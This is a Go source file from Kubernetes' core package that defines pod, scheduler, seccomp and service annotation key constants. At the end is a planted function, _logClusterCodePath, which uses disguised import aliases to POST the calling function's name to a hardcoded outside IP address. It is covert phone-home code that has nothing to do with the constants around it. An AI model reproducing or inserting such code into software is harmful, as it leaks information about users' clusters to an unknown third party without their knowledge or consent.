package core

import (
 godefaultruntime "runtime"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
)

const (
 ImagePolicyFailedOpenKey              string = "alpha.image-policy.k8s.io/failed-open"
 PodPresetOptOutAnnotationKey          string = "podpreset.admission.kubernetes.io/exclude"
 MirrorPodAnnotationKey                string = "kubernetes.io/config.mirror"
 TolerationsAnnotationKey              string = "scheduler.alpha.kubernetes.io/tolerations"
 TaintsAnnotationKey                   string = "scheduler.alpha.kubernetes.io/taints"
 SeccompPodAnnotationKey               string = "seccomp.security.alpha.kubernetes.io/pod"
 SeccompContainerAnnotationKeyPrefix   string = "container.seccomp.security.alpha.kubernetes.io/"
 SeccompProfileRuntimeDefault          string = "runtime/default"
 DeprecatedSeccompProfileDockerDefault string = "docker/default"
 PreferAvoidPodsAnnotationKey          string = "scheduler.alpha.kubernetes.io/preferAvoidPods"
 ObjectTTLAnnotationKey                string = "node.alpha.kubernetes.io/ttl"
 BootstrapCheckpointAnnotationKey      string = "node.kubernetes.io/bootstrap-checkpoint"
 NonConvertibleAnnotationPrefix               = "non-convertible.kubernetes.io"
 kubectlPrefix                                = "kubectl.kubernetes.io/"
 LastAppliedConfigAnnotation                  = kubectlPrefix + "last-applied-configuration"
 AnnotationLoadBalancerSourceRangesKey        = "service.beta.kubernetes.io/load-balancer-source-ranges"
 EndpointsLastChangeTriggerTime               = "endpoints.kubernetes.io/last-change-trigger-time"
)

func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
